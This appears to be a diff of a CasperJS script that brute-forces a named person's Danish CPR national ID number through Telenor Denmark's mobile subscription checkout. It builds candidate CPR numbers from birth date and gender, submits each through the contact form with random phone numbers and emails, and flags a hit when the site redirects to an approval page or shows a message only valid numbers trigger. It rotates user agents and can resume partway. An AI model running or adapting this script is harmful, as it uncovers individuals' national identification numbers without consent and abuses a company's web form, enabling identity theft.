@@ -3,8 +3,8 @@ var casper = require('casper').create({
     loadImages:  false,        // do not load images
     loadPlugins: false         // do not load NPAPI plugins (Flash, Silverlight, ...)
   },
-  verbose: false
-  // logLevel: "debug"
+  verbose: false,
+  logLevel: "debug"
 });
 casper.options.waitTimeout = 10000;
 
@@ -34,6 +34,8 @@ var person = {
     gender: cliOptions.gender,
     lastNames: []
 };
+
+var startFrom = cliOptions.startFrom || 0;
 
 /**************************************************/
 
@@ -65,96 +67,86 @@ var randomNumber = Math.floor(Math.random() * userAgents.length);
 casper.userAgent(userAgents[randomNumber]);
 
 casper.then(function(){
-  console.log(person.firstName);
-  console.log(person.lastName);
-  console.log(person.dob);
-
   // generate list of cpr numbers
   cprList = generateCpr.init(person.dob, person.gender);
 
   // generate full names with different combinations
   person.lastNames = generateLastNames.init(person.lastName);
 
+  console.log(person.firstName);
+  console.log(person.lastName);
+  console.log(person.dob);
+  console.log(person.gender);
+  console.log("Starting from " + cprList[startFrom]);
+
   // Set viewport size
   casper.viewport(1024, 768);
 });
 
+var clickWhenReady = function(selector, succesCallback, index){
+  var successFunction = function(){
+    if(succesCallback) succesCallback();
+    this.click(selector);
+  };
+
+  var errorFunction = function(){
+    index = index || 0;
+    console.log("Error at index: " + index);
+    this.captureSelector('timeout_' + person.dob + '_' + index + '.png', '#content');
+    this.exit();
+  };
+
+  casper.waitForSelector(selector, successFunction, errorFunction);
+};
+
 // Open Page: Lillenor abonnement oversigt
 casper.thenOpen('http://www.telenor.dk/privat/mobilabonnementer/mobilabonnementer/lillenor/index.aspx?icid=megadropdown_mobilabonnementer_lillenor').then(function(){
-  this.waitForSelector('#purchaseBtn', function(){
-    this.click('#purchaseBtn');
-  });
-}, function(){
-  this.captureSelector('timeout_initial_open.png', '#content');
+  console.log('Open start page');
+  clickWhenReady('#purchaseBtn');
 });
 
-// Choose: new number (nummer.aspx)
 casper.then(function(){
-
-  this.then(function(){
-    // Click: new number
-    this.click('#EShop_ChooseNumberXUC1_btnMainNewNumber');
-
-    // wait for numbers and the choose one
-    this.waitForSelector('#subnumbers', function(){
-      this.test.comment('Clicking on number');
-
-      this.waitForSelector('#subnumbers input', function(){
-        this.click('#subnumbers input');
-      });
-    }, function(){
-      this.captureSelector('timeout_choose_number.png', '#content');
-    });
-  });
-
-  this.then(function(){
-    this.test.comment('Clicking next #1');
-    // console.log(this.getCurrentUrl());
-    this.click('#next');
-  });
-
+  console.log('Click: new number');
+  clickWhenReady('#EShop_ChooseNumberXUC1_btnMainNewNumber');
+});
+// wait for numbers and then choose one
+casper.then(function(){
+  clickWhenReady('#subnumbers input');
+});
+casper.then(function(){
+  console.log('Clicking next #1');
+  clickWhenReady('#next');
 });
 
 // wait for next page (service.aspx)
 casper.then(function(){
 
-  this.test.comment('Clicking next #2');
-
+  console.log('Clicking next #2');
   // wait for next breadcrump to become active
   this.waitForSelector('.breadcrumb .active.id-1', function(){
-    // console.log(this.getCurrentUrl());
     this.click('#next[data-rel="FlowNavigator1_ImageButtonNext"]');
   }, function(){
-      // capture screenshot
-      this.test.comment('Timeout clicking next #2');
-      this.captureSelector('timeout_click_next_2.png', '#content');
-  }, 30000);
+    console.log("Error at index: 0");
+    this.captureSelector('timeout_' + person.dob + '.png', '#content');
+  });
 });
 
 // Basket page (basket.aspx)
 casper.then(function(){
-  this.test.comment('Click checkout button');
-  this.waitForSelector('#EShop_Basket1_CheckOutImageButton', function(){
-    // console.log(this.getCurrentUrl());
-    this.click('#EShop_Basket1_CheckOutImageButton');
-  }, function(){
-    // console.log(this.getCurrentUrl());
-    this.test.comment('Timeout checkout button');
-    this.captureSelector('timeout_click_checkout_button.png', '#content');
-  }, 30000);
+  console.log('Click checkout button');
+  clickWhenReady('#EShop_Basket1_CheckOutImageButton');
 });
 
-// Kontaktinformationsside
+// click checkbox: accept cpr (LOLZ!)
 casper.then(function(){
-  this.test.comment('Accept use of cpr');
-
-  // click checkbox: accept cpr (LOLZ!)
-  this.waitForSelector('#_ContactInformation_ContactInformation1_ctl00_ctl00_cbConsent', function(){
-    this.click('#_ContactInformation_ContactInformation1_ctl00_ctl00_cbConsent');
-  });
-  checkCpr(0);
+  console.log('Accept use of cpr');
+  clickWhenReady('#_ContactInformation_ContactInformation1_ctl00_ctl00_cbConsent');
 });
 
+casper.then(function(){
+  console.log('Start checkCpr');
+  checkCpr(startFrom);
+});
 
 var checkCpr = function(index){
   var cpr = person.dob + '-' + cprList[index];
@@ -162,42 +154,43 @@ var checkCpr = function(index){
   var email = getRandomString(8) + '@gmail.com';
 
   casper.then(function(){
+    var successFunction = function(){
 
-    // wait for CPR field
-    this.waitForSelector('#_ContactInformation_ContactInformation1_ctl00_ctl00_tbCpr', function(){
+      // fill out form
+      this.fill('#dotnet', {
+        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbCpr': cpr,
+        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbFirstname': person.firstName,
+        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbLastname': person.lastNames[index],
+        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbPhoneNo': phone,
+        '_ContactInformation_ContactInformation1$ctl00$ctl00$tbEmail': email
+      }, false);
 
-      // wait for email field (last field in form)
-      this.waitForSelector('#_ContactInformation_ContactInformation1_ctl00_ctl00_tbEmail', function(){
-
-        // fill out form
-        this.fill('#dotnet', {
-          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbCpr': cpr,
-          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbFirstname': person.firstName,
-          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbLastname': person.lastNames[index],
-          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbPhoneNo': phone,
-          '_ContactInformation_ContactInformation1$ctl00$ctl00$tbEmail': email
-        }, false);
+      // add dummy element, so we know when the page has changed!
+      casper.evaluate(function() {
+        $('body').append('<p id="casperjs-was-here">Hello</p>');
       });
-    });
+    };
 
-    // add dummy element, so we know when the page has changed!
-    casper.evaluate(function() {
-      $('body').append('<p id="casperjs-was-here">Hello</p>');
-    });
+    var errorFunction = function(){
+      console.log("Error at index: " + index);
+      this.captureSelector('timeout_' + person.dob + '_' + index + '.png', '#content');
+      this.exit();
+    };
 
+    // wait for email field (last field in form)
+    this.waitForSelector('#_ContactInformation_ContactInformation1_ctl00_ctl00_tbEmail', successFunction, errorFunction);
   });
 
   // submit
   casper.then(function(){
-    this.click('.next');
+    clickWhenReady('.next', undefined, index);
   });
 
   // check response
   casper.then(function(){
 
-    // debug
     // console.log(cpr);
-    console.log(person.lastNames[index]);
+    // console.log(person.lastNames[index]);
 
     // We've had a page change!
     this.waitWhileSelector('#casperjs-was-here', function(){
@@ -208,11 +201,10 @@ var checkCpr = function(index){
       }
 
       // success if:
-      // 1) we are redirect to god
+      // 1) we are redirect to godkendelse
       // OR
       // 2) we receive a special message which only correct CPR numbers receive :D
       if(this.getCurrentUrl().indexOf("godkend.aspx") !== -1 || message.indexOf("ikke ske automatisk, men ring til Telenor") !== -1){
-        // console.log(colorizer.colorize(cpr, "GREEN_BAR"));
         console.log("correct: " + cpr);
 
       // Failure
@@ -226,7 +218,7 @@ var checkCpr = function(index){
         }
       } // end of else
     }, function(){
-      this.test.comment('Timeout checking CPR #' + index);
+      console.log('Timeout checking CPR #' + index);
       this.captureSelector('timeout_check_cpr_' + index + '.png', '#content');
     }, 30000); // end of waitWhileSelector
   });
